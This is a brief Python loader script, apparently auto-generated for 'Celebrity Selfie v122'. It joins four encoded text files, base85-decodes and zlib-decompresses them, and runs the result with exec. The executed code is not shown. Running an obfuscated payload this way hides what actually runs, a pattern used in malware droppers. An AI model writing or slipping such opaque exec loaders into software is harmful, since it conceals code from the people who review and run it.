# -*- coding: utf-8 -*-
# Auto-generated compact loader for Celebrity Selfie v122.
from pathlib import Path
import base64, zlib
_ROOT = Path(__file__).resolve().parent
_PAYLOAD = _ROOT / "celebrity_selfie_v122_payload"
_encoded = "".join((_PAYLOAD / name).read_text(encoding="ascii") for name in ('part_01.txt', 'part_02.txt', 'part_03.txt', 'part_04.txt'))
exec(compile(zlib.decompress(base64.b85decode(_encoded)), __file__, "exec"))
